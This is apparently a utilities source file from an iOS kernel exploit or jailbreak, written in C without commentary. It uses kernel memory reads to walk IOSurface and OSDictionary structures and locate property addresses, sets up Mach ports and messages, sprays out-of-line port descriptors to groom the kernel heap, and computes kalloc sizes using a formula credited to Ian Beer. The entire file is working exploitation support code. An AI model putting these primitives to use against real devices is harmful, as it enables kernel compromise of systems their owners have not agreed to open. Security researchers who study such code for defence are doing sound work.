#include "utilities.h"
#include "offsets.h"
#include "memory.h"
#include "time_saved.h"

uint32_t transpose(uint32_t val) {
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8) {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

uint64_t OSDictionary_objectForKey(uint64_t dict, char *key) {
    uint64_t dict_buffer = rk64(dict + 32); // void *
    int i = 0;
    uint64_t key_sym = 0;
    
    do {
        key_sym = rk64(dict_buffer + i); // OSSymbol *
        uint64_t key_buffer = rk64(key_sym + 16); // char *
        if (!kstrcmp_u(key_buffer, key)) {
            return rk64(dict_buffer + i + 8);
        }
        i += 16;
    }
    while (key_sym);
    return 0;
}

uint64_t address_of_property_key(mach_port_t IOSurfaceRootUserClient, uint32_t key) {
    uint64_t IOSRUC_port_addr = find_port(IOSurfaceRootUserClient); // struct ipc_port *
    uint64_t IOSRUC_addr = rk64(IOSRUC_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // IOSurfaceRootUserClient *
    uint64_t IOSC_addr = rk64(rk64(IOSRUC_addr + 280) + 8 * IOSurface_ID); // IOSurfaceClient *
    uint64_t IOSurface_addr = rk64(IOSC_addr + 64); // IOSurface *
    uint64_t all_properties = rk64(IOSurface_addr + 232); // OSDictionary *
    char *skey = malloc(5);
    memcpy(skey, &key, 4);
    uint64_t value = OSDictionary_objectForKey(all_properties, skey);
    free(skey);
    return value;
}


mach_port_t new_port(void) {
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {
        printf("[-] Failed to allocate port (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {
        printf("[-] Failed to insert right (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    
    return port;
}

//1
mach_port_t new_mach_port() {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (ret) {
        printf("[-] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (ret) {
        printf("[-] failed to insert right\n");
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    ret = mach_port_set_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
    if (ret) {
        printf("[-] failed to increase queue limit\n");
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    
    return port;
}

kern_return_t send_message(mach_port_t destination, void *buffer, mach_msg_size_t size) {
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + size;
    struct simple_msg *msg = malloc(msg_size);
    
    memset(msg, 0, sizeof(struct simple_msg));
    
    msg->hdr.msgh_remote_port = destination;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = msg_size;
    
    memcpy(&msg->buf[0], buffer, size);
    
    kern_return_t ret = mach_msg(&msg->hdr, MACH_SEND_MSG, msg_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {
        printf("[-] failed to send message\n");
        mach_port_destroy(mach_task_self(), destination);
        free(msg);
        return ret;
    }
    free(msg);
    return KERN_SUCCESS;
}

struct simple_msg* receive_message(mach_port_t source, mach_msg_size_t size) {
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + size;
    struct simple_msg *msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
 
    kern_return_t ret = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, msg_size, source, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {
        printf("[-] failed to receive message\n");
        return NULL;
    }
    
    return msg;
}

int send_ool_ports(mach_port_t where, int count) {
    kern_return_t ret;
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) ports[i] = MACH_PORT_NULL;
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = 0x80000014;
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = where;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    ret = mach_msg(&msg->hdr, MACH_SEND_MSG|MACH_MSG_OPTION_NONE, msg->hdr.msgh_size, 0, 0, 0, 0);
    free(msg);
    free(ports);
    
    if (ret) {
        printf("[-] Failed to send OOL message: 0x%x (%s)\n", ret, mach_error_string(ret));
        return KERN_FAILURE;
    }
    return 0;
}

// Ian Beer
mach_msg_size_t msg_sz_kalloc2(mach_msg_size_t kalloc_size) {
    return ((3 * kalloc_size) / 4) - 0x74;
}
